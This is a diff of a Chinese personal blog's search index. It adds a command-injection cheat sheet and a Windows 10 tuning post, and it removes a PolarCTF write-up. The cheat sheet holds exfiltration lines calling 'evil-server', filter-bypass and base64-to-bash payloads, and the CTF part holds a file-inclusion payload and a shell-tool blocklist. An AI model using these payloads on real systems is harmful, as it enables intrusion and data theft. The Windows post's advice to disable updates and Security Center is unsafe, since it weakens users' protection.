+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo搭建个人博客教程</title>
     <url>/posts/6e27c1a7.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+Butterfly</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
@@ -1864,61 +2146,6 @@
       </categories>
       <tags>
         <tag>博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Polarctf</title>
-    <url>/posts/f2bbe48e.html</url>
-    <content><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>打开靶机，有一个页面。需要你提交东西，但是提交按钮不能点击。</p>
-<p>查看页面源码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:red&quot;</span>&gt;</span>我说我系签到题,你信吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>现在去获得flag吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;9&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;qiandao&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>本题突破点在语言上，text限制长度9，去掉disabled就可以进行提交。先随便提交，页面会弹窗让你提交<strong>ilovejljcxy</strong>。即可得到flag</p>
-<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>源代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>解释</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一行设置错误报告级别为 0，这表示关闭错误和警告的显示。</span><br><span class="line">第二行获取名为 file 的 GET 请求参数，如果未定义则将其默认设置为 &#x27;1&#x27;。</span><br><span class="line">第三行使用 str_replace() 函数将请求参数中的 &quot;../&quot; 字符串替换为空字符串，以防止访问上层目录的文件。</span><br><span class="line">第四行使用 include_once() 函数包含指定文件。根据上面三行代码的处理，此处的 $file 只能是当前目录下的某个 PHP 文件，而不是其他目录或上层目录中的文件。</span><br><span class="line">最后一行使用 highlight_file() 函数在浏览器中显示当前 PHP 文件的源代码。</span><br><span class="line">需要注意的是，这段代码存在安全风险，因为它允许通过 URL 参数直接包含任何 PHP 文件，并在服务器上执行该文件。如果攻击者可以控制 file 参数，则可以利用这个漏洞来执行任意 PHP 代码。建议在生产环境中谨慎使用此类代码。</span><br></pre></td></tr></table></figure>
-
-<p><strong>解法</strong></p>
-<ol>
-<li>直接访问未经授权的文件：攻击者可以将 file 参数设置为其他目录或上层目录中的 PHP 文件名，直接访问未经授权的文件。</li>
-<li>绕过 ../ 过滤：攻击者可以通过使用双字节字符或 URL 编码等技术来绕过 str_replace() 函数中的 “../“ 过滤，进而访问上级目录中的文件。</li>
-<li>文件包含漏洞：如果攻击者能够控制 file 参数，并且在该参数中注入 PHP 代码，则可以利用文件包含漏洞执行任意 PHP 代码。例如，攻击者可以将 file 参数设置为 “php://input”，并在 POST 请求中发送一个带有 PHP 代码的数据包，从而成功执行恶意代码。</li>
-</ol>
-<p><strong>解题过程</strong></p>
-<p>1.打开页面</p>
-<blockquote>
-<p>我是一个什么都不会的出题人，我啥也不知道,我只知道你不是我可耐的弟弟-。-</p>
-</blockquote>
-<p>2.修改Cookie的Value值为yes。返回Li9kYXRhL2luZGV4LnBocA</p>
-<blockquote>
-<p>base64解码：./data/index.php</p>
-</blockquote>
-<p>3.得到路径，访问得到源码</p>
-<p><strong>payload</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=....//....//....//....//flags</span><br></pre></td></tr></table></figure>
-
-<p>flag{92eb5ffee6ae2fec3ad71c777531578f}</p>
-<h1 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h1><p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PolarD&amp;N CTF</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"><span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;&#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;</span><br><span class="line"><span class="variable">$yyds</span>=(<span class="variable">$_POST</span>[<span class="string">&#x27;yyds&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="variable">$yyds</span>==<span class="string">&#x27;666&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="title function_ invoke__">no</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><code>highlight_file(__FILE__);</code>：使用 <code>highlight_file()</code> 函数显示当前文件（由 <code>__FILE__</code> 常量表示）的源代码，并为 PHP 代码添加语法高亮。这样可以让访问者查看此 PHP 脚本的源代码。</li>
-<li><code>function no($txt)&#123;...&#125;</code>：定义一个名为 <code>no</code> 的函数，接收一个名为 <code>$txt</code> 的参数。此函数用于检查 <code>$txt</code> 参数中是否包含某些字符串（这些字符串通常与系统命令有关），以防止潜在的安全风险。</li>
-<li><code>if(!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;, $txt))&#123;...&#125;</code>：使用 <code>preg_match()</code> 函数和正则表达式检查 <code>$txt</code> 参数中是否包含这些字符串。如果没有匹配项，将返回 <code>$txt</code>；否则，执行 <code>die(&quot;what&#39;s up&quot;);</code>，终止脚本执行并输出错误信息。</li>
-<li><code>$yyds=($_POST[&#39;yyds&#39;]);</code>：从 POST 请求中获取名为 <code>&#39;yyds&#39;</code> 的参数值并将其存储在 <code>$yyds</code> 变量中。</li>
-<li><code>if(isset($_GET[&#39;sys&#39;])&amp;&amp;$yyds==&#39;666&#39;)&#123;...&#125;</code>：检查是否存在名为 <code>&#39;sys&#39;</code> 的 GET 参数，并检查 <code>$yyds</code> 变量是否等于 <code>&#39;666&#39;</code>。如果这两个条件都满足，执行大括号内的代码。</li>
-<li><code>eval(no($_GET[&#39;sys&#39;]));</code>：在满足条件的情况下，获取 GET 请求中的 <code>&#39;sys&#39;</code> 参数值，传递给 <code>no()</code> 函数进行安全检查。如果安全检查通过，使用 <code>eval()</code> 函数执行该参数值中的 PHP 代码。</li>
-<li><code>else &#123;echo &quot;nonono&quot;;&#125;</code>：如果条件不满足，输出字符串 “nonono”。</li>
-</ol>
-<p>这段代码的主要目的是接收用户输入，并在满足一定条件且经过安全检查后，执行用户提供的 PHP 代码。同时，使用highlight_file()函数显示源代码，让访问者可以查看脚本的实现。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -2188,6 +2415,49 @@
       </categories>
       <tags>
         <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win10使用优化</title>
+    <url>/posts/f970716d.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
+<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
+
+<p><strong>关闭计划任务</strong></p>
+<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
+<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
+
+<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
+<p>然后如图所示，点开服务。</p>
+<p><strong>关闭并禁用这些服务</strong></p>
+<p><strong>Connected User Experiences and Telemetry</strong></p>
+<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
+<p><strong>Diagnostic Execution Service</strong></p>
+<p>系统诊断执行服务 没什么卵用</p>
+<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
+<p>家庭组服务，没什么卵用.</p>
+<p><strong>windows server</strong></p>
+<p>如果不经常使用系统搜索就关闭它</p>
+<p><strong>Program CompatibilityAssistant Service</strong></p>
+<p>兼容助手服务，</p>
+<p><strong>SecurityCenter</strong></p>
+<p>安全中心服务，直接禁用</p>
+<p><strong>SysMain</strong></p>
+<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
+<p>以上服务全部禁用。</p>
+<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
+<p>只勾选：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
+
+<p>顺便设置下 系统启动设置</p>
+]]></content>
+      <categories>
+        <category>win系统</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
       </tags>
   </entry>
 </search>
